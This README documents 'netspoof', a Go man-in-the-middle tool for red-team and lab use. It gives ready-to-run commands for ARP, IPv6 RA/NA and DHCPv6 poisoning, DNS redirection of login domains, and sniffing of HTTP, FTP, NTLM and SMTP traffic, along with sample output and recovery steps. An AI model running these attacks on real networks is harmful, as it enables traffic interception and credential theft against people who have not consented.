# netspoof

A lightweight, self-contained LAN man-in-the-middle tool for **authorized red-team engagements and lab work**. Single Go binary with **no runtime C dependencies** — uses `pcapgo.EthernetHandle` for capture and `AF_PACKET` raw sockets for injection.

Supports ARP spoofing (IPv4), NDP spoofing (IPv6 RA + NA), DHCPv6 advertisement, DNS spoofing over both stacks, and passive packet sniffing with protocol parsers.

**For authorized testing only.** See the [Legal](#legal) section.

---

## Table of contents

- [What it does](#what-it-does)
- [Requirements](#requirements)
- [Build](#build)
- [Usage](#usage)
- [Attack combinations](#attack-combinations)
- [Client compatibility](#client-compatibility)
- [What gets restored on shutdown](#what-gets-restored-on-shutdown)
- [Sample output](#sample-output)
- [Architecture](#architecture)
- [Known limitations](#known-limitations)
- [Credits](#credits)
---

## What it does

`netspoof` redirects traffic on a local network through the attacker's machine and, optionally, modifies the responses the victim sees.

| Module | Protocol | Effect |
|---|---|---|
| `arp` | IPv4 ARP | Poisons ARP caches so IPv4 traffic routes through us |
| `ndp` | IPv6 ICMPv6 (RA + NA) | Broadcasts Router Advertisements and unicast Neighbor Advertisements — SLAAC attack + IPv6 neighbor poisoning |
| `dhcp6` | IPv6 DHCPv6 | Answers DHCPv6 SOLICIT/REQUEST with a link-local address and our own DNS server |
| `dns` | UDP/53 | Intercepts and answers DNS queries with spoofed A/AAAA records |
| `sniff` | Multiple | Passive parsing of HTTP, DNS, TLS SNI, FTP, NTLM, SMTP |

All modules share a single writer queue and a single live host table, so they compose cleanly without packet-handle races.

---

## Requirements

- **Linux** (tested on Ubuntu 22.04 / Debian 12, kernel 5.x+)
- **Root** (raw sockets)
- **Go 1.21+** to build

**No `libpcap`, no `libpcap-dev`, no CGO.** Capture uses `github.com/google/gopacket/pcapgo` (Linux `AF_PACKET`). Injection uses `golang.org/x/sys/unix` directly.

---

## Build

```bash
git clone https://github.com/<you>/netspoof
cd netspoof
go mod tidy
go build -o netspoof .
```

Result: a single `netspoof` binary in the current directory.

Because there are no C dependencies, cross-compilation is easy:

```bash
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o netspoof .
```

The result runs on any Linux with a compatible kernel — no runtime packages required.

---

## Usage

```
sudo ./netspoof [flags]
```

**Must run as root.** All parameters auto-detect unless overridden. Always use `-time` when testing so restoration runs even if you lose access.

### Global flags

| Flag | Default | Description |
|---|---|---|
| `-iface` | auto-detect | Network interface (e.g. `eth0`, `ens18`) |
| `-gateway` | auto-detect | Gateway IPv4 address |
| `-targets` | whole subnet | Comma-separated IPs to poison. If omitted, all live hosts on the subnet. |
| `-spoof` | `{gateway}` | Comma-separated IPs to impersonate. Add DNS servers to intercept DNS. |
| `-fullduplex` | `false` | Also poison the gateway's view of each target. |
| `-run` | `arp` | Comma-separated modules: `arp`, `ndp`, `dhcp6`, `dns`, `sniff` |
| `-time` | `0` (infinite) | Auto-shutdown after this duration (`30s`, `2m`, `1h`) |

### DNS flags

| Flag | Default | Description |
|---|---|---|
| `-dns-address` | — | IPv4 address to reply with for matched domains |
| `-dns-domains` | — | Comma-separated domain patterns (wildcards `*` allowed) |
| `-dns` | — | Per-domain overrides, e.g. `foo.com=1.2.3.4,*.bar.com=5.6.7.8` |

### NDP flags

| Flag | Default | Description |
|---|---|---|
| `-ndp-targets` | auto (all live IPv6 hosts) | Comma-separated IPv6 addresses for NA |
| `-ndp-prefix` | `d00d::/64` | Prefix advertised in Router Advertisements |
| `-ndp-lifetime` | `30` | Router lifetime in seconds |
| `-ndp-no-na` | `false` | Skip Neighbor Advertisements, only send RAs |

### DHCPv6 flags

| Flag | Default | Description |
|---|---|---|
| `-dhcp6-dns` | our link-local | DNS server IPv6 to advertise via DHCPv6 |

When `dhcp6` is in `-run`, NDP automatically sets `M=1` and `O=1` in its RAs and omits the SLAAC prefix.

### Sniffer flags

| Flag | Default | Description |
|---|---|---|
| `-sniff-all` | `false` | Log every packet, not just app-aware events |

---

## Attack combinations

Each combination does something different. Pick the one that fits your scenario.

### 1. ARP spoof only (IPv4 MITM baseline)

Poison the gateway and every live host so all IPv4 traffic flows through us.

```bash
sudo ./netspoof -run arp -time 60s
```

Single target:

```bash
sudo ./netspoof -run arp -targets 192.168.1.50 -time 60s
```

Also poison the DNS server so we see DNS queries:

```bash
sudo ./netspoof -run arp -targets 192.168.1.50 \
  -spoof 192.168.1.1,192.168.1.53 -time 60s
```

**Verify:** `arp -a` on the victim shows the gateway's IP mapped to your MAC.

### 2. ARP + sniff (observe IPv4 traffic)

Log HTTP requests, DNS queries, TLS SNI hostnames.

```bash
sudo ./netspoof -run arp,sniff -targets 192.168.1.50 -time 120s
```

Browse to a website on the victim — you'll see:

```
[http] 192.168.1.50 -> 172.217.0.1:80 GET / HTTP/1.1 host=example.com
[tls]  192.168.1.50 -> 172.217.0.1:443 SNI=www.google.com
[dns]  192.168.1.50:54321 -> 192.168.1.53:53 www.google.com(A)
```

For verbose packet logging:

```bash
sudo ./netspoof -run arp,sniff -sniff-all -targets 192.168.1.50 -time 120s
```

### 3. ARP + DNS (redirect domains on IPv4)

Intercept the victim's IPv4 DNS queries and answer with spoofed records.

```bash
sudo ./netspoof -run arp,dns \
  -targets 192.168.1.50 \
  -spoof 192.168.1.1,192.168.1.53 \
  -dns-address 10.10.10.10 \
  -dns-domains "login.example.com,*.internal" \
  -time 120s
```

**Critical:** the victim's DNS server IP **must** be in `-spoof`. Otherwise DNS queries bypass us and the spoof does nothing.

**Verify:** `nslookup login.example.com` on the victim returns `10.10.10.10`.

Per-domain overrides:

```bash
sudo ./netspoof -run arp,dns \
  -targets 192.168.1.50 \
  -spoof 192.168.1.1,192.168.1.53 \
  -dns "login.example.com=10.10.10.10,*.internal=10.10.10.20" \
  -time 120s
```

### 4. NDP RA only (SLAAC attack)

Broadcast Router Advertisements. Every IPv6-capable host accepts us as its IPv6 gateway and DNS server.

```bash
sudo ./netspoof -run ndp -time 60s
```

Custom prefix:

```bash
sudo ./netspoof -run ndp -ndp-prefix "2001:db8:beef::/64" -time 60s
```

**Verify:** `netsh interface ipv6 show route` on a Windows victim shows `::/0` pointing at our link-local.

### 5. NDP + NA (per-target IPv6 poisoning)

Unicast Neighbor Advertisements to specific IPv6 hosts claiming the gateway's IPv6 is at our MAC.

```bash
sudo ./netspoof -run ndp -ndp-targets "fe80::1111,fe80::2222" -time 60s
```

**Note:** NA only has an effect if the target already has a fresh entry for the address we're claiming. On a LAN with no real IPv6 router, there's nothing to poison — RA does all the work.

### 6. NDP + DHCPv6 (IPv6 takeover)

RA sets M=1, clients ask for DHCPv6, we answer with a link-local address and our DNS.

```bash
sudo ./netspoof -run ndp,dhcp6 -time 120s
```

**Verify:**
- Windows: `netsh interface ipv6 show dnsservers` shows our link-local.
- Windows: `ipconfig /release6 && ipconfig /renew6` triggers a fresh DHCPv6 exchange.
- `netspoof` stdout shows `[dhcp6] ADVERTISE` and `[dhcp6] REPLY`.

### 7. Full IPv4 DNS + IPv6 takeover

The maximum-coverage mode. ARP spoofs the IPv4 DNS path, NDP takes over IPv6, DHCPv6 serves clients, DNS spoofs both stacks, sniffer logs everything.

```bash
sudo ./netspoof -run arp,ndp,dhcp6,dns,sniff \
  -targets 192.168.1.50 \
  -spoof 192.168.1.1,192.168.1.53 \
  -dns-address 10.10.10.10 \
  -dns-domains "login.example.com,*.internal" \
  -time 300s
```

### 8. Ban mode (block, don't MITM)

Poison the victim but **do not** enable forwarding, so its traffic dies at our machine.

```bash
# Not yet implemented as a flag — see Roadmap.
```

---

## Client compatibility

DNS spoofing requires that the victim's DNS queries actually reach us. Different clients choose different DNS servers.

| Client type | `arp,dns` works? | `ndp,dhcp6,dns` works? |
|---|---|---|
| Windows on a normal LAN | ✅ | ❌ (Windows prefers IPv4 DNS) |
| Windows with IPv4 DNS removed | ✅ | ✅ |
| macOS | ✅ | ⚠️ Sometimes |
| iOS / modern Android | ✅ | ✅ |
| Linux (default config) | ✅ | ⚠️ Depends on resolv.conf |
| IPv6-only clients | N/A | ✅ |

**For Windows targets, always use ARP.** NDP and DHCPv6 extend the reach to IPv6 but don't replace ARP for DNS spoofing on IPv4-preferring clients.

---

## What gets restored on shutdown

All modules run a cleanup function on `Ctrl+C`, `SIGTERM`, or `-time` expiry.

| Module | What changes | Restoration |
|---|---|---|
| ARP | Victim ARP caches | Correction ARPs + gratuitous ARP broadcast |
| NDP | Default route, IPv6 DNS, `d00d::` address | RA with lifetime 0 + deprecation RA |
| DHCPv6 | Victim's IPv6 DNS server | Lease expires in 60s; DNS entry stays until victim removes it |
| DNS | Victim's DNS cache | Expires after the response TTL (currently 1024s) |
| Sysctls | `ip_forward`, `rp_filter`, `send_redirects`, `accept_redirects` | Restored to previous values |

**Residual state after a clean shutdown:**

- ARP entries: revert immediately.
- IPv6 default route: reverts within ~1 second.
- `d00d::` address: marked **Deprecated** immediately, fully expires in 2 hours (RFC minimum).
- DHCPv6-installed IPv6 DNS server: **stays on the victim indefinitely**. Remove with `netsh interface ipv6 delete dnsservers "Ethernet 2" all` on Windows.
- DNS cache: expires after the DNS response TTL.

A hard kill (`kill -9`) skips cleanup. Recover on the victim:

```bash
# On Linux victim
sudo ip neigh flush all
sudo sysctl -w net.ipv4.ip_forward=0
```

```
REM On Windows victim (admin cmd)
arp -d *
netsh interface ipv6 delete dnsservers "Ethernet 2" all
netsh interface ipv6 delete address "Ethernet 2" all
```

---

## Sample output

Running `sudo ./netspoof -run arp,sniff -targets 10.0.20.60 -time 60s`:

```
[session] iface=ens18 our=10.0.20.32 gw=10.0.20.1 targets=1 spoofed=[10.0.20.1]
[arp] ip_forward was "0", enabling
[arp] forwarding sysctls: saved 12, zeroed 6
[arp] ip_forward enabled
[arp] started: targets=1 explicit spoofed=[10.0.20.1] fullduplex=false
[arp] gateway 10.0.20.1 = bc:24:11:38:22:50
[sniff] started (mode=app-aware filter="not arp and not (ip6 and udp and (port 546 or port 547))")
[dns] 10.0.20.60:54321 -> 10.0.20.51:53 google.com(A)
[tls] 10.0.20.60 -> 142.250.185.78:443 SNI=www.google.com
[http] 10.0.20.60 -> 93.184.216.34:80 GET / HTTP/1.1 host=example.com
^C
[netspoof] signal received, shutting down
[arp] shutting down, restoring ARP state
[arp] restoring IPv4 forwarding sysctls
```

---

## Architecture

```
main.go                   Flag parsing, session setup, module dispatch, signal handling
capture.go                Pure-Go capture + injection (pcapgo + AF_PACKET)
session.go                Interface/gateway auto-detection, session state
lan.go                    Shared MAC table (IPv4 + IPv6)
queue.go                  Single-writer Tx queue (thread-safe packet injection)
discovery.go              Periodic `ip neigh` polling — populates LAN table
arp.go                    ARP spoofing + restoration
ndp.go                    Router Advertisements + Neighbor Advertisements
dhcp6.go                  DHCPv6 server
dns.go                    DNS spoofer
sniff.go                  Packet sniffer with protocol parsers
```

**Design principles:**

- **No C dependencies.** Capture uses `pcapgo.EthernetHandle`; injection uses `AF_PACKET` raw sockets. Static, cross-compilable binaries.
- **Single source of truth.** All modules read from `Session.Lan` for MAC addresses.
- **Single writer.** All packet injection goes through `Session.Tx`. Multiple writers on one handle are unsafe.
- **Synchronous setup, deferred cleanup.** Modules enable sysctls synchronously; restoration runs in `defer`.
- **Panic on missing prerequisites.** If the gateway MAC or gateway IPv6 can't be resolved, the module panics rather than running with an incomplete config.

---

## Known limitations

- **Full-duplex ARP fails against gateways with ARP protection.** Cisco DAI, some hypervisors, and modern routers defend against gratuitous ARP. Test with `-fullduplex` only on permissive networks.
- **Virtio NICs may corrupt checksums on forwarded packets.** If the victim loses connectivity during spoofing despite correct forwarding, this is a known virtio issue.
- **NDP RA is broadcast to the entire LAN.** Every IPv6 host on the segment is affected. There is no way to target individual hosts with RA.
- **DHCPv6 answers every client on the LAN.** Currently no `-targets` filtering — implement before using on production networks.
- **No IPv6-only DNS spoofing on Windows.** Windows prefers IPv4 DNS. NDP+DHCPv6+DNS won't spoof DNS on Windows unless its IPv4 DNS is removed.
- **Sniffer deduplicates nothing.** A single TLS ClientHello split across multiple packets will log multiple `[tls]` lines for the same connection. Track `(src, dst, port)` to fix.

---

## Roadmap

- [ ] DHCPv6 `-targets` filtering (currently answers whole LAN)
- [ ] `-noforward` flag for ban mode (poison without forwarding)
- [ ] Sniffer deduplication (one log line per connection)
- [ ] Sniffer log file output (`-sniff-log /path/to/file`)
- [ ] HTTP proxy module (intercept and modify HTTP traffic)
- [ ] PCAP export

---

## Legal

netspoof is intended for **authorized security testing only**:

- Penetration tests with written authorization
- Internal red-team exercises on infrastructure you own
- Security research on isolated lab networks
- Educational demonstrations with explicit consent

**Using netspoof against networks or devices you do not own, or without explicit written authorization, is illegal in most jurisdictions**, including under:

- The Computer Fraud and Abuse Act (US, 18 U.S.C. § 1030)
- The Computer Misuse Act (UK, 1990)
- Section 66 of the Information Technology Act (India)
- Similar legislation worldwide

You are solely responsible for ensuring you have proper authorization before running this tool. "I was just testing" is not a legal defense.

---

## Credits

netspoof is original Go code. It uses the following MIT/BSD-licensed libraries:

- [github.com/google/gopacket](https://github.com/google/gopacket) — packet parsing, serialization, and `pcapgo` capture (BSD-3-Clause)
- [github.com/mdlayher/ndp](https://github.com/mdlayher/ndp) — ICMPv6 / NDP (MIT)
- [github.com/mdlayher/dhcp6](https://github.com/mdlayher/dhcp6) — DHCPv6 codec (MIT)
- [golang.org/x/sys/unix](https://pkg.go.dev/golang.org/x/sys/unix) — raw socket injection (BSD-3-Clause)

No code from Bettercap, Ettercap, or any source-available tool is included. Feature inspiration comes from the public documentation of those tools; the implementation is independent.
